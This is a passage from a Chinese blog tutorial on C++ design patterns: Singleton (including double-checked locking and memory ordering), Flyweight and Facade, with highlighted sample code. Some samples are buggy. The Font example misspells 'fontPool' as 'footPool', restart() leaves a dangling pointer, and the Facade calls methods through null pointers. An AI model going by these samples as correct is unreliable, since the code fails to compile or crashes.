class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">static</span> Singleton* m_instance;<br>    Singleton();<br>    Singleton(<span class="hljs-keyword">const</span> Singleton&amp; other);<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Singleton* <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>;<br>&#125;;<br><br>Singleton* Singleton::m_instance=<span class="hljs-literal">nullptr</span>;<br><br><span class="hljs-comment">//线程非安全版本</span><br><span class="hljs-function">Singleton* <span class="hljs-title">Singleton::getInstance</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (m_instance == <span class="hljs-literal">nullptr</span>) &#123;<br>        m_instance = <span class="hljs-keyword">new</span> Singleton();<br>    &#125;<br>    <span class="hljs-keyword">return</span> m_instance;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>版本二，代价过高（相对而言）</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//线程安全版本，但锁的代价过高. 读变量，不需要获取锁，只有写才需要加锁</span><br><span class="hljs-function">Singleton* <span class="hljs-title">Singleton::getInstance</span><span class="hljs-params">()</span> </span>&#123;<br>    Lock lock;<br>    <span class="hljs-keyword">if</span> (m_instance == <span class="hljs-literal">nullptr</span>) &#123;<br>        m_instance = <span class="hljs-keyword">new</span> Singleton();<br>    &#125;<br>    <span class="hljs-keyword">return</span> m_instance;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>双检查，第一个判断保证读变量不会获取锁。第二个判断，保证当两个或多个线程都进入了第一个判断内，不会创建多个对象。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//双检查锁，但由于内存读写reorder不安全，直接以下代码是不能应用的</span><br><span class="hljs-function">Singleton* <span class="hljs-title">Singleton::getInstance</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(m_instance==<span class="hljs-literal">nullptr</span>)&#123;<br>        Lock lock;<br>        <span class="hljs-keyword">if</span> (m_instance == <span class="hljs-literal">nullptr</span>) &#123;<br>            m_instance = <span class="hljs-keyword">new</span> Singleton();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> m_instance;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>但是，m_instance = new Singleton()在cpu指令执行的时候，可能会出现指令reorder的情况。因为编译器会对汇编代码进行优化。比如，指令顺序为（分配内存--调用构造器--将对象赋值到变量内存），可能变成（分配内存--将对象赋值到变量内存--调用构造器）。</p><p>因此，当指令执行顺序是（分配内存--将对象赋值到变量内存--调用构造器）时，线程1可能处在（分配内存--将对象赋值到变量内存）阶段，此时m_instance != nullptr。如果此时线程2，开始第一个判断，会直接跳转到return m_instance，但是 m_instance并没有调用构造器，并不是一个可用的对象。问题就出现了。</p><p>C++ 11版本之后的跨平台实现双检查：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//C++ 11版本之后的跨平台实现 (Java 中使用 volatile 禁止cpu指令reorder)</span><br><span class="hljs-built_in">std</span>::atomic&lt;Singleton*&gt; Singleton::m_instance;<br><span class="hljs-built_in">std</span>::mutex Singleton::m_mutex;<br><br><span class="hljs-function">Singleton* <span class="hljs-title">Singleton::getInstance</span><span class="hljs-params">()</span> </span>&#123;<br>    Singleton* tmp = m_instance.load(<span class="hljs-built_in">std</span>::memory_order_relaxed);<br>    <span class="hljs-built_in">std</span>::atomic_thread_fence(<span class="hljs-built_in">std</span>::memory_order_acquire);<span class="hljs-comment">//获取内存fence</span><br>    <span class="hljs-keyword">if</span> (tmp == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-function"><span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(m_mutex)</span></span>;<br>        tmp = m_instance.load(<span class="hljs-built_in">std</span>::memory_order_relaxed);<br>        <span class="hljs-keyword">if</span> (tmp == <span class="hljs-literal">nullptr</span>) &#123;<br>            tmp = <span class="hljs-keyword">new</span> Singleton;<br>            <span class="hljs-built_in">std</span>::atomic_thread_fence(<span class="hljs-built_in">std</span>::memory_order_release);<span class="hljs-comment">//释放内存fence</span><br>            m_instance.store(tmp, <span class="hljs-built_in">std</span>::memory_order_relaxed);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> tmp;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Singleton的构造器可以设置为protected，允许子类派生。一般不要支持拷贝构造函数，或者clone接口。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/24/23-17-22-f5bee7.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><p>单线程版</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Singleton</span><br><span class="hljs-comment"> * has private static variable to hold one instance of the class</span><br><span class="hljs-comment"> * and method which gives us a way to instantiate the class</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">// The copy constructor and assignment operator</span><br>  <span class="hljs-comment">// are defined as deleted, which means that you</span><br>  <span class="hljs-comment">// can't make a copy of singleton.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Note: you can achieve the same effect by declaring</span><br>  <span class="hljs-comment">// the constructor and the operator as private</span><br>  Singleton( Singleton <span class="hljs-keyword">const</span>&amp; ) = <span class="hljs-keyword">delete</span>;<br>  Singleton&amp; <span class="hljs-keyword">operator</span>=( Singleton <span class="hljs-keyword">const</span>&amp; ) = <span class="hljs-keyword">delete</span>;<br><br>  <span class="hljs-function"><span class="hljs-keyword">static</span> Singleton* <span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( !instance )<br>    &#123;<br>      instance = <span class="hljs-keyword">new</span> Singleton();<br>    &#125;    <br>    <span class="hljs-keyword">return</span> instance;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">restart</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( instance )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> instance;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tell</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"This is Singleton."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Singleton() &#123;&#125;<br>  <span class="hljs-keyword">static</span> Singleton *instance;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br>Singleton* Singleton::instance = <span class="hljs-literal">nullptr</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Singleton::<span class="hljs-built_in">get</span>()-&gt;tell();<br>  Singleton::restart();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="flyweight">Flyweight</span></h3><p>对于大量存在的对象，会产生较高的内存上代价。</p><p>Flyweight（享元）运用共享技术有效地支持大量细粒度的对象。</p><p>原理就是将对象以一个全局唯一key，储存在一个对象记录数据结构中。当下一次使用同一对象，直接查找记录，返回已经存在的对象。</p><h4><span id="示例6">示例6</span></h4><p>实现能够显示每种字体属性的程序。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Font</span> &#123;</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">//unique object key</span><br>    <span class="hljs-built_in">string</span> key;<br>    <br>    <span class="hljs-comment">//object state</span><br>    <span class="hljs-comment">//...</span><br><span class="hljs-keyword">public</span>:<br>    Font(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; key)&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FontFactory</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 使用map作为一个对象记录</span><br>    <span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">string</span>,Font* &gt; fontPool;<br>    <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Font* <span class="hljs-title">GetFont</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; key)</span></span>&#123;<br>        <span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">string</span>,Font*&gt;::iterator item=fontPool.<span class="hljs-built_in">find</span>(key);<br>        <br>        <span class="hljs-keyword">if</span>(item!=footPool.<span class="hljs-built_in">end</span>())&#123;<br>            <span class="hljs-keyword">return</span> fontPool[key];<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            Font* font = <span class="hljs-keyword">new</span> Font(key);<br>            fontPool[key]= font;<br>            <span class="hljs-keyword">return</span> font;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//...</span><br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>享元，在对象数量很多，并且因此造成性能负担的时候，可以考虑使用。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/00-10-04-e2d7e4.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Flyweight</span><br><span class="hljs-comment"> * declares an interface through which flyweights can receive</span><br><span class="hljs-comment"> * and act on extrinsic state</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flyweight</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Flyweight() &#123;&#125;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * UnsharedConcreteFlyweight</span><br><span class="hljs-comment"> * not all subclasses need to be shared</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsharedConcreteFlyweight</span> :</span> <span class="hljs-keyword">public</span> Flyweight<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  UnsharedConcreteFlyweight( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> intrinsic_state ) :<br>    state( intrinsic_state ) &#123;&#125;<br>  <br>  ~UnsharedConcreteFlyweight() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Unshared Flyweight with state "</span> &lt;&lt; state &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ConcreteFlyweight</span><br><span class="hljs-comment"> * implements the Flyweight interface and adds storage</span><br><span class="hljs-comment"> * for intrinsic state</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteFlyweight</span> :</span> <span class="hljs-keyword">public</span> Flyweight<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteFlyweight( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> all_state ) :<br>    state( all_state ) &#123;&#125;<br>  <br>  ~ConcreteFlyweight() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Flyweight with state "</span> &lt;&lt; state &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * FlyweightFactory</span><br><span class="hljs-comment"> * creates and manages flyweight objects and ensures</span><br><span class="hljs-comment"> * that flyweights are shared properly</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlyweightFactory</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  ~FlyweightFactory()<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">auto</span> it = flies.<span class="hljs-built_in">begin</span>(); it != flies.<span class="hljs-built_in">end</span>(); it++ )<br>    &#123;<br>        <span class="hljs-keyword">delete</span> it-&gt;second;<br>    &#125;<br>    flies.<span class="hljs-built_in">clear</span>();<br>  &#125;<br>  <br>  <span class="hljs-function">Flyweight *<span class="hljs-title">getFlyweight</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> key )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( flies.<span class="hljs-built_in">find</span>( key ) != flies.<span class="hljs-built_in">end</span>() )<br>    &#123;<br>      <span class="hljs-keyword">return</span> flies[ key ];<br>    &#125;<br>    Flyweight *fly = <span class="hljs-keyword">new</span> ConcreteFlyweight( key );<br>    flies.insert( <span class="hljs-built_in">std</span>::pair&lt;<span class="hljs-keyword">int</span>, Flyweight *&gt;( key, fly ) );<br>    <span class="hljs-keyword">return</span> fly;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">int</span>, Flyweight*&gt; flies;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  FlyweightFactory *factory = <span class="hljs-keyword">new</span> FlyweightFactory;<br>  factory-&gt;getFlyweight(<span class="hljs-number">1</span>)-&gt;operation();<br>  factory-&gt;getFlyweight(<span class="hljs-number">2</span>)-&gt;operation();<br>  <span class="hljs-keyword">delete</span> factory;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="接口隔离相关模式">接口隔离相关模式</span></h2><p>在软件构建过程中，某些接口之间的“直接”依赖可能会带来很多问题，甚至无法实现。这时候，往往采用添加一层“间接”的稳定接口层，来实现间接的依赖。</p><p>间接的中间层思想，很常见，比如指针就是一种间接层，操作系统是用户程序和机器硬件之间的中间层。</p><p>典型模式：</p><ol type="1"><li>Facade (c不是英文字符，整个词是个法文，不过这不重要)</li><li>Proxy</li><li>Adapter</li><li>Mediator</li></ol><h3><span id="facade">Facade</span></h3><p>为子系统中的一组接口提供一个一致的界面，Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p><p>目标效果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/10-29-17-902bb3.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>Facade模式更注重架构层次，偏向架构设计的模式。实现了内部组件和外部客户程序的解耦。其内部组件一般是相互依赖的一系列类型。</p><p>Facade模式为一个复杂子系统提供一个简单接口时。子系统往往因为不断演化而变得越来越复杂。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/10-34-22-1c86aa.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Subsystems</span><br><span class="hljs-comment"> * implement more complex subsystem functionality</span><br><span class="hljs-comment"> * and have no knowledge of the facade</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SubsystemA</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">suboperation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Subsystem A method"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SubsystemB</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">suboperation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Subsystem B method"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SubsystemC</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">suboperation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Subsystem C method"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Facade</span><br><span class="hljs-comment"> * delegates client requests to appropriate subsystem object</span><br><span class="hljs-comment"> * and unified interface that is easier to use</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Facade</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  Facade() : subsystemA(), subsystemB(), subsystemC() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    subsystemA-&gt;suboperation();<br>    subsystemB-&gt;suboperation();<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    subsystemC-&gt;suboperation();<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  SubsystemA *subsystemA;<br>  SubsystemB *subsystemB;<br>  SubsystemC *subsystemC;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Facade *facade = <span class="hljs-keyword">new</span> Facade();<br>  <br>  facade-&gt;operation1();<br>  facade-&gt;operation2();<br>  <span class="hljs-keyword">delete</span> facade;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span 